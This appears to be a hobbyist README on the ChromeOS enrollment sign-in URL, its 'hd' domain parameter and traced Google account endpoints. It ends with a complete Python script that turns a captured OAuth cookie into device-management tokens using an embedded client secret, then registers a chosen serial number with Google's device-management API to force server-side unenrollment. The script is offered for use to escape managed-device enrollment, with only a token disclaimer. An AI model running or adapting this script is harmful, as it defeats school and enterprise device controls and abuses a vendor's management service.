# crOS-DI-URL

chromeos oobe sign in process assets

## what's the DI?

chromeos's di (domain identifier) is what controls what a chromeos device's domain manages the device. the URL is

* https://accounts.google.com/v3/signin/identifier?client_id=77185425430.apps.googleusercontent.com&flow=deviceEnrollment&hd=type-any-domain-here&hl=en-US&use_native_navigation=1&flowName=GlifSetupChromeOs&continue=http://accounts.google.com/programmatic_auth_chromeos?hl%3Den-US%26scope%3Dhttps://www.google.com/accounts/OAuthLogin%26client_id%3D77185425430.apps.googleusercontent.com%26access_type%3Doffline&dsh=S-1374596101:1780346705514969

after "deviceEnrollment&hd=" is where the DI is set. hd stands for hosted domain, the same usage and meaning as DI.

if webview was controllable in chromeos OOBE, you would be able to change the DI to gmail.com for example, and sign in with a personal account. unfortunately, webview isn't controllable so it is unknown if this would be an exploit.

## where is the DI used?

the DI is used on login to your chromeos device. the hd will change depending on the signup flow.

## how was the URL found?

although it's likely that you could've just looked through google source code of chromeos for webview usage on OOBE to find this URL, it was found by trafficking through strict cloudflare restrictions on a proxy, leading to chromeos webview saying the site couldn't be reached, and literally saying the URL.

## url findings

these are the URLs found while tracing the chromeos OOBE google sign-in flow.

* `https://accounts.google.com/v3/signin/identifier` — **confirmed:** main Google account identifier page used by the OOBE sign-in flow. `deviceEnrollment` and `hd` appear here.
* `https://accounts.google.com/v3/signin/` — **confirmed:** Google sign-in endpoint family used by the OOBE flow.
* `https://accounts.google.com/signin/recovery` — **confirmed:** Google account recovery endpoint.
* `https://accounts.google.com/AccountChooser` — **found:** Google account chooser endpoint used by the sign-in interface.
* `https://accounts.google.com/restart` — **found / redirects:** redirects back into the Google sign-in flow.
* `https://accounts.google.com/Logout` — **found:** Google logout endpoint referenced by the sign-in process.
* `https://accounts.google.com/_/bscframe` — **found:** Google background/frame endpoint used by the account UI.
* `https://accounts.google.com/_/AccountsSignInUi` — **found:** Google Accounts sign-in UI endpoint.
* `https://accounts.youtube.com` — **found:** Google/YouTube account authentication surface encountered while tracing the account flow.
* `http://accounts.google.com/programmatic_auth_chromeos` — **confirmed:** ChromeOS-specific programmatic authentication continuation URL embedded in the main OOBE URL. it requests the OAuthLogin scope and offline access.
* `https://accounts.google.com/interstitial/doritos/forward/success` — **404 when tested:** endpoint was found during tracing, but the tested success path returned 404.
* `https://accounts.google.com/interstitial/doritos/forward/timeout` — **404 when tested:** endpoint was found during tracing, but the tested timeout path returned 404.

## READ THIS

update: `hd=*`: Forces Google to ask for an account from any managed Google Workspace domain (blocking standard @gmail.com personal accounts). you could probably still remove the hd parameter entirely.

none of the URLs above, by themselves, prove that the DI can be bypassed. the important part is that `hd` is supplied as part of the ChromeOS device-enrollment sign-in flow. changing it would require control over the OOBE webview/navigation rather than simply editing a normal browser URL.

recovery in chromeos webview: https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifSetupChromeOs&dsh=S-368440106%3A1787169239399889

one of the coolest things to edit enrollment state that I found was that when going to the url, it gives a cookie which chromeos can use to intrepert the user signing into  a managed device. this means if we inspect and grab the cookie that contains something like "oauth code" we could have a script with websocket access prevent enrollment on a device by getting its serial # and using the cookie to manipulate the management into thinking the specific account doesn't require enrollment on the device with that serial, leading to serverside unenrollment, essentially!

** ok, I just heard that someone just found this and I'm completely uncredited. here is the script they wrote for my theory to work. open a compiler that supports python and run this. please do not do this on an unauthorized device, I do not encourage that. this is just a cool little thing.

```
import uuid
import time
import requests
import os
import device_management_backend_pb2 as proto

serial_number = input("serial number: (REMOVE THESE PARANTHESES AND WRITE YOUR SERIAL NUMBER HERE)").strip()
oauth_code = input("oauth code: (REMOVE THESE PARANTHESES AND WRITE THE COOKIE FROM THAT LINK HERE)").strip()

response = requests.post(
    "https://www.googleapis.com/oauth2/v4/token",
    data={
        "code": oauth_code,
        "client_id": "77185425430.apps.googleusercontent.com",
        "client_secret": "OTJgUOQcT7lO7GsGZq2G4IlT",
        "grant_type": "authorization_code",
    },
)

response.raise_for_status()
refresh_token = response.json()["refresh_token"]

response = requests.post(
    "https://www.googleapis.com/oauth2/v4/token",
    data={
        "client_id": "77185425430.apps.googleusercontent.com",
        "client_secret": "OTJgUOQcT7lO7GsGZq2G4IlT",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "https://www.googleapis.com/auth/chromeosdevicemanagement https://www.googleapis.com/auth/userinfo.email",
    },
)

response.raise_for_status()
oauth_token = response.json()["access_token"]

device_id = str(uuid.uuid4())

register_request = proto.DeviceRegisterRequest()
register_request.type = proto.DeviceRegisterRequest.DEVICE
register_request.machine_id = serial_number

request = proto.DeviceManagementRequest()
request.register_request.CopyFrom(register_request)

response = requests.post(
    f"https://m.google.com/devicemanagement/data/api?devicetype=2&apptype=Chrome&request=register&deviceid={device_id}&oauth_token={oauth_token}",
    headers={
        "Content-Type": "application/protobuf",
    },
    data=request.SerializeToString(),
)

data = proto.DeviceManagementResponse()
data.ParseFromString(response.content)

if data.error_message:
    exit(f"registration error: {data.error_message}")

dmtoken = data.register_response.device_management_token

policy_fetch_request = proto.PolicyFetchRequest()
policy_fetch_request.policy_type = "google/chromeos/device"

state_key_update_request = proto.DeviceStateKeyUpdateRequest()
for _ in range(5):
    state_key_update_request.server_backed_state_keys.append(os.urandom(32))

request = proto.DeviceManagementRequest()
request.policy_request.requests.append(policy_fetch_request)
request.device_state_key_update_request.CopyFrom(state_key_update_request)

response = requests.post(
    f"https://m.google.com/devicemanagement/data/api?retry=false&apptype=Chrome&deviceid={device_id}&devicetype=2&request=policy",
    headers={
        "Authorization": f"GoogleDMToken token={dmtoken}",
        "Content-Type": "application/protobuf",
    },
    data=request.SerializeToString(),
)

data = proto.DeviceManagementResponse()
data.ParseFromString(response.content)

print(data)
```
